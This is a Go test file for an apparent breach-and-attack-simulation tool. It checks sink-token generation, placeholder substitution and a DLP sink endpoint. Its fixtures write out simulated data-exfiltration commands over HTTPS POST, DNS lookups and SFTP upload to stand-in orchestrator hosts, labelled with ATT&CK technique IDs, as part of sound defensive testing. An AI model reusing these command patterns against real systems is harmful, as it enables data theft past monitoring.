package api

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/audspect/bas/internal/dnssink"
	"github.com/audspect/bas/internal/scenario"
	"github.com/audspect/bas/internal/ws"
	"github.com/jackc/pgx/v5/pgxpool"
)

func TestGenerateSinkToken_ProducesUniqueUnpredictableValues(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 100; i++ {
		tok, err := generateSinkToken(32)
		if err != nil {
			t.Fatalf("generateSinkToken(32): %v", err)
		}
		if len(tok) != 64 { // 32 bytes hex-encoded = 64 chars
			t.Fatalf("token %q wrong length for 32-byte input: got %d chars, want 64", tok, len(tok))
		}
		if seen[tok] {
			t.Fatalf("generateSinkToken produced a duplicate: %q", tok)
		}
		seen[tok] = true
	}
}

func TestGenerateSinkToken_ShorterLengthForDNSLabelSafety(t *testing.T) {
	tok, err := generateSinkToken(8)
	if err != nil {
		t.Fatalf("generateSinkToken(8): %v", err)
	}
	if len(tok) != 16 { // 8 bytes hex-encoded = 16 chars
		t.Fatalf("token %q wrong length for 8-byte input: got %d chars, want 16", tok, len(tok))
	}
	if len(tok) > 63 {
		t.Fatalf("token %q exceeds the 63-character DNS label limit", tok)
	}
}

func TestIssueSinkTokensAndSubstitute_ReplacesPlaceholdersOnlyWherePresent(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T9999", Command: "Invoke-RestMethod -Uri '{{SINK_URL}}' -Body @{token='{{SINK_TOKEN}}'}"},
			{TechniqueID: "T1052.001", Command: "Copy-Item -Path $src -Destination $dest"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sink-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if strings.Contains(out[0].Command, "{{SINK_TOKEN}}") || strings.Contains(out[0].Command, "{{SINK_URL}}") {
			t.Fatalf("step 0 still has unsubstituted placeholders: %s", out[0].Command)
		}
		if !strings.Contains(out[0].Command, "https://orchestrator.example:9443/api/dlp/sink") {
			t.Fatalf("step 0 command doesn't contain the expected sink URL: %s", out[0].Command)
		}
		if out[1].Command != "Copy-Item -Path $src -Destination $dest" {
			t.Fatalf("step 1 (no placeholder) was modified: %s", out[1].Command)
		}

		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-sink-1' AND technique_id = 'T9999'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows for run-sink-1/T9999 = %d, want 1", count)
		}
	})
}

func TestDLPSink_RecordsReceiptForAnyPostedToken(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		body, _ := json.Marshal(map[string]any{
			"token":   "some-token-value",
			"payload": "[BAS-SIM-DLP] fake regulated data",
			"channel": "https-post",
		})
		req := httptest.NewRequest(http.MethodPost, "/api/dlp/sink", bytes.NewReader(body))
		req.RemoteAddr = "10.0.0.5:54321"
		rec := httptest.NewRecorder()
		h.DLPSink(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
		}

		var count int
		var sourceIP, channel string
		var payloadSize int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_receipts WHERE token = 'some-token-value'`,
		).Scan(&count); err != nil {
			t.Fatalf("count receipts: %v", err)
		}
		if count != 1 {
			t.Fatalf("receipt count = %d, want 1", count)
		}
		if err := pool.QueryRow(context.Background(),
			`SELECT source_ip, channel, payload_size FROM dlp_sink_receipts WHERE token = 'some-token-value'`,
		).Scan(&sourceIP, &channel, &payloadSize); err != nil {
			t.Fatalf("read receipt: %v", err)
		}
		if !strings.HasPrefix(sourceIP, "10.0.0.5") {
			t.Errorf("source_ip = %q, want prefix 10.0.0.5", sourceIP)
		}
		if channel != "https-post" {
			t.Errorf("channel = %q, want https-post", channel)
		}
		if payloadSize == 0 {
			t.Error("payload_size should reflect the posted payload's length")
		}

		var rawPayloadStored bool
		rows, _ := pool.Query(context.Background(), `SELECT column_name FROM information_schema.columns WHERE table_name = 'dlp_sink_receipts'`)
		for rows.Next() {
			var col string
			rows.Scan(&col)
			if col == "payload" || col == "raw_payload" {
				rawPayloadStored = true
			}
		}
		rows.Close()
		if rawPayloadStored {
			t.Error("dlp_sink_receipts must never store the raw payload, only a hash -- found a raw-payload column")
		}
	})
}

func TestDLPSink_UnrecognizedTokenStillReturns200(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		body, _ := json.Marshal(map[string]any{"token": "never-issued-token", "payload": "x", "channel": "https-post"})
		req := httptest.NewRequest(http.MethodPost, "/api/dlp/sink", bytes.NewReader(body))
		rec := httptest.NewRecorder()
		h.DLPSink(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("status = %d, want 200 even for an unrecognized token", rec.Code)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_DNSPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1071.004", Command: "nslookup 000.4.{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}} {{SINK_DNS_SERVER}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-dns-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_DNS_CAMPAIGN_ID}}") || strings.Contains(cmd, "{{SINK_DNS_SERVER}}") || strings.Contains(cmd, "{{SINK_DNS_DOMAIN}}") {
			t.Fatalf("DNS placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_DNS_SERVER must not include the port: %s", cmd)
		}
		if !strings.Contains(cmd, dnssink.DomainSuffix) {
			t.Fatalf("expected dnssink.DomainSuffix (%s) in the command: %s", dnssink.DomainSuffix, cmd)
		}

		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-dns-1' AND technique_id = 'T1071.004'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows for run-dns-1/T1071.004 = %d, want 1", count)
		}
	})
}

func TestDNSServerHost_StripsSchemeAndPort(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://orchestrator.example:9443", "orchestrator.example"},
		{"https://10.0.0.5:9443", "10.0.0.5"},
		{"http://localhost", "localhost"},
	}
	for _, c := range cases {
		got := dnsServerHost(c.in)
		if got != c.want {
			t.Errorf("dnsServerHost(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestIssueSinkTokensAndSubstitute_SFTPPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.002", Command: "sftp -P {{SINK_SFTP_PORT}} dlptest@{{SINK_SFTP_HOST}} <<< 'put file {{SINK_TOKEN}}.dat'"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_SFTP_HOST}}") || strings.Contains(cmd, "{{SINK_SFTP_PORT}}") {
			t.Fatalf("SFTP placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_SFTP_HOST must not include the port: %s", cmd)
		}
		if !strings.Contains(cmd, "2222") {
			t.Fatalf("expected the default SINK_SFTP_PORT (2222) in the command: %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-sftp-1' AND technique_id = 'T1048.002'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (SFTP reuses the existing 32-byte/64-hex-char token, not a new byte-length variant)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SFTPDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Regression: the SFTP placeholder block must NOT generate its own
	// {{SINK_TOKEN}} -- every real SFTP-wired step's command contains
	// {{SINK_TOKEN}} too (as the upload filename), which the existing
	// unconditional first block already issues and substitutes. A second
	// token issued here would never appear in the final command (a no-op
	// ReplaceAll on text that no longer contains the placeholder) and
	// would sit in dlp_sink_tokens as dead weight -- exactly one row must
	// exist per run+technique, not two.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.002", Command: "sftp -P {{SINK_SFTP_PORT}} dlptest@{{SINK_SFTP_HOST}} <<< 'put file {{SINK_TOKEN}}.dat'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-orphan", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-sftp-orphan' AND technique_id = 'T1048.002'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the SFTP block)", count)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SFTPHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_SFTP_HOST", "sftp-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.002", Command: "target={{SINK_SFTP_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "sftp-external.example.net") {
			t.Fatalf("expected the SINK_SFTP_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}
